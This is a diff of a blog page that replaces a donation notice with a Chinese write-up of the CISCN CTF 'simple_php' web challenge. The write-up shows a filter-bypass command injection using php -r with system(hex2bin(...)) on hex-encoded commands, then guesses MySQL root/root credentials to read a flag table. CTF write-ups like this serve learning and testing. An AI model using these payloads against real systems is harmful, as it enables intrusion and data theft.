@@ -3,7 +3,7 @@
 <html lang="zh-cn">
 <head>
     <meta charset="utf-8" />
-    <title>赞赏 | Live For Code</title>
+    <title>ciscn-wp | Live For Code</title>
     <meta name="author" content="Live For Code" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -37,6 +37,10 @@
 
 
 <script src="/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -152,25 +156,49 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>赞赏</h1>
+        <h1>ciscn-wp</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2020/1/1
+            2024/5/18
         </span>
         
         
     </div>
     
     <div class="content" v-pre>
-        <blockquote>
-<p>如果喜欢我的博客，或者喜欢我的博客主题，可以考虑赞赏一下哦，非常感激！<br>网站所需的服务器和 CDN 都是不小的开支，日常维护也需要大量精力。 <br>你们的支持是我前进的最大动力！</p>
-</blockquote>
+        <h1 id="ciscn-writeup"><a href="#ciscn-writeup" class="headerlink" title="ciscn writeup"></a>ciscn writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-php（复现）"><a href="#simple-php（复现）" class="headerlink" title="simple_php（复现）"></a>simple_php（复现）</h3><p>比赛的时候一直在尝试其他命令，看了wp才发现能用php -r ‘代码’来执行php语句或者系统命令</p>
+<p>与此相似的还有<code>php -i</code>可以查看phpinfo等等</p>
+<p>但是由于题目过滤了许多关键字，我们可以利用hex2bin转码绕过过滤</p>
+<p>hex2bin(‘语句’);	但是由于过滤了引号，使用substr截取一个字符(这里是下划线)，剩下的就会被识别为字符串</p>
+<p>hex编码	ls &#x2F;    -&gt; 6c73202f</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6c73202f,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/1.png"></p>
+<p>命令成功执行</p>
+<p>之后找了一圈没发现flag，ps -def指令可以查看进程</p>
+<p>ps -def -&gt; _7073202d646566</p>
+<p><img src="/../images/ciscn/2.png"></p>
+<p>其中看到了mysql,flag应该在数据库中</p>
+<p>直接猜账户root密码为root, -e执行sql语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p<span class="string">&#x27;root&#x27;</span> -e <span class="string">&#x27;show databases;&#x27;</span></span><br><span class="line">cmd=php -r system(hex2bin(substr(_6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27,1)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/3.png"></p>
+<p>有PHP_CMS information_schema mysql performance_schema test这几个库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;use PHP_CMS;show tables;&#x27;`</span><br><span class="line">#注意sql语句用反引号执行</span><br><span class="line">#结果Tables_in_PHP_CMS F1ag_Se3Re7</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7&#x27;`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/4.png"></p>
+<p>拿到flag!</p>
 
     </div>
+    
+    
+    
+    
+    
     
     
 </div>
@@ -203,6 +231,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
